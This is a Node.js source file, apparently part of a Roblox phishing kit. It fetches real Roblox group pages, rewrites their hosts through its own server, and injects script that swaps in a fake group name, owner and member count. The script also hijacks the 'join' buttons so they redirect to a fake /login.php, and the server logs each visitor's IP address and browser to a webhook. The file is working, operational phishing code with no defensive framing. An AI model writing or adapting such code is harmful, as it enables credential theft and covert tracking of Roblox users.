// Node port of community.php. Fetches the real Roblox group page, rewrites its
// hosts through this server, and injects the fake community identity.
const fs = require('fs');
const axios = require('axios');
const R = require('../runtime');

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const COMMUNITIES_FILE = R.seededDataPath('fake_communities.json');
const GROUPS_FILE = R.seededDataPath('fake_groups.json');

function loadJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')) || {}; } catch { return {}; }
}

function injectIntoHead(html, markup) {
    const headStart = html.search(/<head\b/i);
    if (headStart === -1) return markup + html;
    const insertAt = html.indexOf('>', headStart);
    if (insertAt === -1) return markup + html;
    return html.slice(0, insertAt + 1) + markup + html.slice(insertAt + 1);
}

async function fetchHtml(url, timeout = 15_000) {
    const res = await axios.get(url, {
        headers: {
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        timeout,
        maxRedirects: 5,
        responseType: 'text',
        validateStatus: () => true
    }).catch(() => null);
    if (!res || res.status !== 200 || !res.data) return null;
    return String(res.data);
}

async function sendWebhook(url, payload) {
    if (!url) return;
    try {
        await axios.post(url, payload, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 4000,
            validateStatus: () => true
        });
    } catch { /* webhook failures are not page failures */ }
}

function buildScript({ fakeName, fakeDescription, fakeOwner, memberCount, communityId }) {
    return `<script>
(function() {
    'use strict';

    function rewriteUrl(url) {
        if (typeof url !== 'string') {
            if (url instanceof URL) url = url.toString();
            else if (url instanceof Request) url = url.url;
            else return url;
        }
        var m;
        m = url.match(/^(?:https?:)?\\/\\/css\\.rbxcdn\\.com\\/(.*)$/i);      if (m) return '/rbxcdn/' + m[1];
        m = url.match(/^(?:https?:)?\\/\\/static\\.rbxcdn\\.com\\/(.*)$/i);   if (m) return '/staticrbx/' + m[1];
        m = url.match(/^(?:https?:)?\\/\\/images\\.rbxcdn\\.com\\/(.*)$/i);   if (m) return '/imgrbx/' + m[1];
        m = url.match(/^(?:https?:)?\\/\\/tr\\.rbxcdn\\.com\\/(.*)$/i);       if (m) return '/thumbnails/' + m[1];
        m = url.match(/^(?:https?:)?\\/\\/js\\.rbxcdn\\.com\\/(.*)$/i);       if (m) return '/rblx-js/' + m[1];
        var baseHost = window.location.hostname.replace(/^www\\./i, '');
        var escapedHost = baseHost.replace(/[-\\/\\\\^$*+?.()|[\\]{}]/g, '\\\\$&');
        var pattern = new RegExp('^(?:https?:)?\\\\/\\\\/([a-z0-9\\\\-]+)\\\\.(?:roblox\\\\.com|localhost|' + escapedHost + ')(.*)$', 'i');
        m = url.match(pattern);
        if (m) {
            var sub = m[1].toLowerCase(), path = m[2];
            if (sub === 'www') return path || '/';
            if (sub === 'thumbnails') sub = 'thumbnails-api';
            else if (sub === 'games') sub = 'games-api';
            else if (sub === 'ab-testing') sub = 'abtesting';
            return '/rblx-' + sub + path;
        }
        return url;
    }

    var oFetch = window.fetch;
    window.fetch = function(input, init) {
        if (typeof input === 'string') input = rewriteUrl(input);
        else if (input instanceof Request) input = new Request(rewriteUrl(input.url), input);
        else if (input instanceof URL) input = rewriteUrl(input.toString());
        return oFetch.call(this, input, init);
    };
    var oXHR = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, url, rest) { return oXHR.call(this, m, rewriteUrl(url), rest); };

    var FAKE_NAME = ${JSON.stringify(fakeName)};
    var FAKE_DESCRIPTION = ${JSON.stringify(fakeDescription)};
    var FAKE_OWNER = ${JSON.stringify(fakeOwner)};
    var FAKE_MEMBER_COUNT = ${JSON.stringify(memberCount + ' Members')};

    function patch() {
        if (document.title && FAKE_NAME) document.title = FAKE_NAME + ' - Roblox';

        var realName = null;
        var h1 = document.querySelector('h1');
        if (h1 && h1.textContent.trim() !== FAKE_NAME) {
            realName = h1.textContent.trim();
        }

        function replaceExactText(oldVal, newVal) {
            if (!oldVal || !newVal || oldVal === newVal) return;
            var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
            var node;
            while (node = walker.nextNode()) {
                if (node.nodeValue.includes(oldVal)) {
                    node.nodeValue = node.nodeValue.replace(oldVal, newVal);
                }
            }
        }

        if (realName && FAKE_NAME) {
            replaceExactText(realName, FAKE_NAME);
        }

        document.querySelectorAll('h1, .community-name, .group-name, .group-title, [data-testid="group-name"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_NAME;
        });
        document.querySelectorAll('.community-description, .group-description, .description, [data-testid="group-description"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_DESCRIPTION;
        });
        document.querySelectorAll('.owner-name, .group-owner, [data-testid="group-owner"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = 'By ' + FAKE_OWNER;
        });
        document.querySelectorAll('.member-count, .group-members, [data-testid="group-members"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_MEMBER_COUNT;
        });
    }

    patch();
    new MutationObserver(patch).observe(document.documentElement, { childList: true, subtree: true });

    fetch('/api/community/${communityId}/webhook', { method: 'POST' })
        .then(r => r.json())
        .then(d => console.log('Webhook dispatched:', d))
        .catch(e => console.log('Webhook error:', e));

    var timer = setInterval(function() {
        document.querySelectorAll('button').forEach(function(btn) {
            var t = btn.textContent.toLowerCase();
            if (t.indexOf('join') !== -1 || t.indexOf('request') !== -1) {
                btn.addEventListener('click', function(e) {
                    e.stopImmediatePropagation(); e.preventDefault();
                    location.href = '/login.php?returnUrl=/communities/${communityId}&communityId=${communityId}';
                }, true);
            }
        });
    }, 500);
    setTimeout(function() { clearInterval(timer); }, 30000);
})();
</script>`;
}

async function communityPage(req, res, communityIdParam) {
    const communityId = String(communityIdParam || req.query.id || '').trim();
    if (!communityId) return res.status(404).type('text/plain').send('Community not found');

    const communities = loadJson(COMMUNITIES_FILE);
    const groups = loadJson(GROUPS_FILE);

    let fakeCommunity = communities[communityId] || null;
    let webhookUrl = '';

    if (fakeCommunity) {
        webhookUrl = fakeCommunity.webhook_url || '';
    } else if (groups[communityId]) {
        const fg = groups[communityId];
        fakeCommunity = {
            fakeGroupId: communityId,
            real_group_id: fg.realGroupId || '',
            fake_group_name: fg.fakeGroupName || 'Roblox Community',
            fake_group_description: fg.fakeGroupDesc || '',
            fake_group_owner: fg.ownerUsername || 'Roblox',
            fake_member_count: fg.memberCount || 0,
            webhook_url: fg.webhookUrl || ''
        };
        webhookUrl = fg.webhookUrl || '';
    }

    if (!fakeCommunity) {
        return res.status(404).type('text/plain').send('Community not found');
    }

    const fakeName = fakeCommunity.fake_group_name || fakeCommunity.fakeGroupName || 'Roblox Community';
    const fakeDescription = fakeCommunity.fake_group_description || fakeCommunity.fakeGroupDesc || '';
    const fakeOwner = fakeCommunity.fake_group_owner || fakeCommunity.ownerUsername || 'Roblox';
    const memberCount = Number(fakeCommunity.fake_member_count || fakeCommunity.memberCount || 0);
    const targetCommunityId = String(
        fakeCommunity.real_group_id || fakeCommunity.realGroupId || communityId
    );

    const html = await fetchHtml(`https://www.roblox.com/groups/${encodeURIComponent(targetCommunityId)}/-`);
    if (!html) {
        return res.status(502).type('text/plain').send('Failed to fetch community page from Roblox');
    }

    const host = req.get('host') || '127.0.0.1';
    let out = html
        .split('https://www.roblox.com/').join(`//${host}/`)
        .split('https://tr.rbxcdn.com/').join('/thumbnails/')
        .split('https://images.rbxcdn.com/').join('/imgrbx/')
        .split('https://css.rbxcdn.com/').join('/rbxcdn/')
        .split('https://js.rbxcdn.com/').join('/rblx-js/')
        .split('https://static.rbxcdn.com/').join('/staticrbx/');

    out = injectIntoHead(out, buildScript({
        fakeName,
        fakeDescription,
        fakeOwner,
        memberCount: memberCount.toLocaleString('en-US'),
        communityId
    }));

    const ip = (req.headers['x-forwarded-for'] || req.ip || 'unknown').toString().split(',')[0].trim();
    const ua = req.get('User-Agent') || 'unknown';
    await sendWebhook(webhookUrl, {
        embeds: [{
            title: '🏛️ Community Page Visited',
            description: `**Community:** ${fakeName}\n**ID:** ${communityId}\n\n**IP:** \`${ip}\`\n**UA:** \`${ua}\`\n**Time:** \`${new Date().toISOString()}\``,
            color: 5814783
        }]
    });

    return res.type('text/html').send(out);
}

module.exports = { communityPage };
